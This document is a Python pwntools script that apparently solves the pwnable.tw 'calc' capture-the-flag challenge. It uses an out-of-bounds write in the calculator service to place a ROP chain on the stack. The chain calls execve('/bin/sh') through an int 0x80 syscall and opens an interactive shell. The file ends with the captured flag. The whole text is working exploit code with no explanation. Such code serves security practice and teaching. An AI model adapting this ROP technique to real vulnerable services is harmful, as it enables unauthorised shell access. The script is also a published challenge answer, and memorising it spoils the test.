from pwn import *


def rop_chain(offset, value):
    sh.sendline(offset)
    stack_value = int(sh.recvline())
    # set stack_value 0
    if stack_value < 0:
        sh.sendline(offset + "+" + str(-stack_value))
    else:
        sh.sendline(offset + "-" + str(stack_value))
    sh.recvline()
    # set stack_value own value
    if value > 0x7fffffff:
        sh.sendline(offset + "-" + str(0xffffffff - value + 1))
    else:
        sh.sendline(offset + "+" + str(value))
    sh.recvline()


def offset_binsh():
    sh.sendline("+360")
    main_ebp = int(sh.recvline())
    main_esp = main_ebp & 0xfffffff0 - 0x10  # offset="+362"
    offset = main_esp + (369 - 362) * 4
    return offset


sh = remote("chall.pwnable.tw", 10100)
sh.recvline()
# execve(path='/bin/sh', argv=0, envp=0)
rop_chain("+361", 0x805c34b)        # pop eax; ret
rop_chain("+362", 11)               # eax = 11
rop_chain("+363", 0x80701aa)        # pop edx; ret
rop_chain("+364", 0)                # ecx = 0
rop_chain("+365", 0x80701d1)        # pop ecx; pop ebx; ret
rop_chain("+366", 0)                # edx = 0
rop_chain("+367", offset_binsh())   # "/bin/sh\x00"
rop_chain("+368", 0x8049a21)        # int 0x80
rop_chain("+369", u32("/bin"))
rop_chain("+370", u32("/sh\x00"))
sh.sendline()
sh.interactive()

# FLAG{C:\Windows\System32\calc.exe}
